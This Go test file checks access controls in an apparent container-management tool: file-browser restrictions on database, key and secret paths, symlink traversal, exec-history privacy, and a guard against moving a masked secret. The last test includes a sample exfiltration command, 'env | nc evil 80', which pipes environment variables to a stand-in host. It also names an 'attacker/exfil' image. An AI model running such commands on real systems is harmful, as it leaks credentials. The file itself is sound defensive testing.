// Copyright (c) 2026 McSparrow. All rights reserved.
// McHarbor is licensed under the McHarbor License. See LICENSE for details.

package containers

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"testing"

	"github.com/therealmcsparrow/mcharbor/core/envredact"
)

// newProtectedFixture is the reveal fixture with McHarbor's data directory at /app/data, a
// DSN secret file, a global system.manage holder ("admin") and McHarbor's data volume known
// as mcharbor_data.
func newProtectedFixture(t *testing.T) *revealFixture {
	t.Helper()
	f := newRevealFixture(t)
	f.h.app.Config.DataDir = "/app/data"
	f.h.app.Config.DBDSNFile = "/custom/secrets/dsn.txt"
	f.h.dataSourceFn = func(context.Context) []string { return []string{"mcharbor_data"} }
	for _, q := range []string{
		`INSERT INTO users (id, username, password_hash) VALUES ('admin', 'admin', 'x')`,
		`INSERT INTO roles (id, name, permissions) VALUES ('r-admin', 'r-admin', '["system.manage","containers.view"]')`,
		`INSERT INTO user_roles (id, user_id, role_id, environment_id) VALUES ('ur3', 'admin', 'r-admin', NULL)`,
	} {
		if _, err := f.db.Exec(q); err != nil {
			t.Fatalf("seed %q: %v", q, err)
		}
	}
	return f
}

func (f *revealFixture) auditCount(t *testing.T, action string) int {
	t.Helper()
	var n int
	if err := f.db.QueryRow(`SELECT COUNT(*) FROM audit_logs WHERE action = ?`, action).Scan(&n); err != nil {
		t.Fatal(err)
	}
	return n
}

// TestFileBrowserKeepsMcHarborDataFromViewers is C1 of the 2026-09-30 review: a
// containers.view holder downloaded McHarbor's database, WAL and TLS keys through the Files
// tab. They now need system.manage, and every refusal is audited.
func TestFileBrowserKeepsMcHarborDataFromViewers(t *testing.T) {
	f := newProtectedFixture(t)
	for _, p := range []string{
		"/app/data/mcharbor.db", "/app/data/mcharbor.db-wal", "/app/data/tls/key.pem",
		"/app/data/tls/ca-key.pem", "/run/secrets/postgres_password", "/custom/secrets/other",
	} {
		if rec := f.get(t, "viewer", "/containers/mcharbor/files/content?env=envA&path="+p); rec.Code != http.StatusForbidden {
			t.Errorf("viewer read of %s on McHarbor: HTTP %d, want 403", p, rec.Code)
		}
		if rec := f.get(t, "ops", "/containers/mcharbor/files/content?env=envA&path="+p+"&download=true"); rec.Code != http.StatusForbidden {
			t.Errorf("containers.manage download of %s on McHarbor: HTTP %d, want 403", p, rec.Code)
		}
	}
	for _, dir := range []string{"/app/data", "/app/data/tls", "/run/secrets"} {
		if rec := f.get(t, "viewer", "/containers/mcharbor/files?env=envA&path="+dir); rec.Code != http.StatusForbidden {
			t.Errorf("viewer listing of %s on McHarbor: HTTP %d, want 403", dir, rec.Code)
		}
	}
	if n := f.auditCount(t, "secret_file_read_denied"); n == 0 {
		t.Error("refused reads left no secret_file_read_denied audit rows")
	}
	if n := f.auditCount(t, "secret_file_list_denied"); n == 0 {
		t.Error("refused listings left no secret_file_list_denied audit rows")
	}

	if rec := f.get(t, "admin", "/containers/mcharbor/files/content?env=envA&path=/app/data/mcharbor.db"); rec.Code != http.StatusOK {
		t.Errorf("system.manage read of the database: HTTP %d, want 200 (body %s)", rec.Code, rec.Body.String())
	}
	if n := f.auditCount(t, "secret_file_read"); n != 1 {
		t.Errorf("permitted system.manage read audit rows = %d, want 1", n)
	}
	if rec := f.get(t, "admin", "/containers/mcharbor/files/content?env=envA&path=/app/data/.secret"); rec.Code != http.StatusForbidden {
		t.Errorf("system.manage read of the data-directory secret: HTTP %d, want 403 (no permission opens a key file)", rec.Code)
	}
	if rec := f.get(t, "viewer", "/containers/mcharbor/files/content?env=envA&path=/etc/hostname"); rec.Code != http.StatusOK {
		t.Errorf("viewer read of an ordinary McHarbor path: HTTP %d, want 200", rec.Code)
	}
}

// TestFileBrowserFollowsSymlinksIntoTheDataDirectory: a parent symlink is followed by the
// archive API, so /tmp/link/mcharbor.db with /tmp/link -> /app/data is the database.
func TestFileBrowserFollowsSymlinksIntoTheDataDirectory(t *testing.T) {
	f := newProtectedFixture(t)
	f.daemon.links = map[string]string{"/tmp/link": "/app/data", "/tmp/rel": "../app/data/tls"}
	for _, p := range []string{"/tmp/link/mcharbor.db", "/tmp/rel/key.pem", "/tmp/link/.secret"} {
		if rec := f.get(t, "viewer", "/containers/mcharbor/files/content?env=envA&path="+p); rec.Code != http.StatusForbidden {
			t.Errorf("viewer read of %s through a symlink: HTTP %d, want 403", p, rec.Code)
		}
	}
	if rec := f.get(t, "viewer", "/containers/mcharbor/files/content?env=envA&path=/tmp/other.txt"); rec.Code != http.StatusOK {
		t.Errorf("viewer read of an unlinked path: HTTP %d, want 200", rec.Code)
	}
}

// TestFileBrowserKeyFilesDataVolumeAndProc is M5: key file names are refused on every
// container, a mount of McHarbor's data volume on another container is protected, and
// /proc (which holds every process's environment) needs system.manage.
func TestFileBrowserKeyFilesDataVolumeAndProc(t *testing.T) {
	f := newProtectedFixture(t)
	refused := map[string]string{
		"sidecar": "/backup/mcharbor.db",
		"web":     "/proc/1/environ",
	}
	for target, p := range refused {
		if rec := f.get(t, "viewer", "/containers/"+target+"/files/content?env=envA&path="+p); rec.Code != http.StatusForbidden {
			t.Errorf("viewer read of %s on %s: HTTP %d, want 403", p, target, rec.Code)
		}
	}
	for _, p := range []string{"/run/secrets/mcharbor_db_dsn", "/custom/secrets/dsn.txt", "/srv//x/./mcharbor_secret"} {
		if rec := f.get(t, "admin", "/containers/web/files/content?env=envA&path="+p); rec.Code != http.StatusForbidden {
			t.Errorf("read of key file %s on an ordinary container: HTTP %d, want 403", p, rec.Code)
		}
	}
	if rec := f.get(t, "viewer", "/containers/sidecar/files?env=envA&path=/backup"); rec.Code != http.StatusForbidden {
		t.Errorf("viewer listing of the data-volume mount: HTTP %d, want 403", rec.Code)
	}
	if rec := f.get(t, "admin", "/containers/web/files/content?env=envA&path=/proc/1/environ"); rec.Code != http.StatusOK {
		t.Errorf("system.manage read of /proc: HTTP %d, want 200", rec.Code)
	}
	for _, p := range []string{"/etc/app.conf", "/backup-notes.txt", "/processes.txt"} {
		if rec := f.get(t, "viewer", "/containers/sidecar/files/content?env=envA&path="+p); rec.Code != http.StatusOK {
			t.Errorf("viewer read of %s: HTTP %d, want 200 (no false positive)", p, rec.Code)
		}
	}
}

// TestExecHistoryHidesOthersOutputFromViewers is M1: exec history is a containers.view route
// but carries other people's stdout, which only an exec (containers.manage) could produce.
func TestExecHistoryHidesOthersOutputFromViewers(t *testing.T) {
	f := newProtectedFixture(t)
	for _, q := range []string{
		`INSERT INTO container_exec_history (id, user_id, environment_id, container_id, container_name, command, stdout, created_at)
		 VALUES ('e1', 'ops', 'envA', 'web', 'web', '["cat","/etc/shadow"]', 'root:secret-hash', '2026-09-30T10:00:00Z'),
		        ('e2', 'viewer', 'envA', 'web', 'web', '["id"]', 'uid=0', '2026-09-30T11:00:00Z')`,
	} {
		if _, err := f.db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	ids := func(userID string) []string {
		rec := f.get(t, userID, "/containers/web/exec/history?env=envA")
		if rec.Code != http.StatusOK {
			t.Fatalf("exec history as %s: HTTP %d %s", userID, rec.Code, rec.Body.String())
		}
		var body struct {
			Data []ExecHistoryEntry `json:"data"`
		}
		if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
			t.Fatal(err)
		}
		var out []string
		for _, e := range body.Data {
			out = append(out, e.ID)
		}
		return out
	}
	if got := ids("viewer"); len(got) != 1 || got[0] != "e2" {
		t.Errorf("viewer exec history = %q, want only their own row e2", got)
	}
	if got := ids("ops"); len(got) != 2 {
		t.Errorf("containers.manage exec history = %q, want both rows", got)
	}
}

// TestRecreateRefusesMovingAWithheldValue is M2 (1) on the container side: an editor who sees
// a pinned value only as the marker must not keep it while pointing the container at an
// image of their choosing, which would hand the value to that image.
func TestRecreateRefusesMovingAWithheldValue(t *testing.T) {
	f := newProtectedFixture(t)
	f.h.svc.SetPinnedSecrets(envredact.PinnedValues(testPinnedSecret))
	fakeInspect["copier"] = `{"Id":"eeeeeeeeeeee0000000000000000000000000000000000000000000000000005","Name":"/copier",` +
		`"State":{"Status":"exited","Running":false},"Config":{"Image":"example/app:1","Env":["COPIED=` + testPinnedSecret +
		`","MODE=blue"],"Labels":{}},"HostConfig":{},"NetworkSettings":{"Networks":{}}}`
	t.Cleanup(func() { delete(fakeInspect, "copier") })
	env := []string{"COPIED=" + envredact.Marker, "MODE=green"}
	for name, req := range map[string]RecreateRequest{
		"image":      {Env: env, Image: "attacker/exfil:1"},
		"command":    {Env: env, Cmd: []string{"sh", "-c", "env | nc evil 80"}},
		"entrypoint": {Env: env, Entrypoint: []string{"/exfil"}},
		"labels":     {Env: env, Labels: map[string]string{"x": "y"}},
	} {
		if _, err := f.h.svc.Recreate(context.Background(), "envA", "copier", req); !errors.Is(err, ErrMaskedValueMoved) {
			t.Errorf("%s change keeping the pinned value: err = %v, want ErrMaskedValueMoved", name, err)
		}
	}
	if _, err := f.h.svc.Recreate(context.Background(), "envA", "copier", RecreateRequest{Env: env}); err != nil {
		t.Fatalf("an env-only edit must still recreate: %v", err)
	}
}
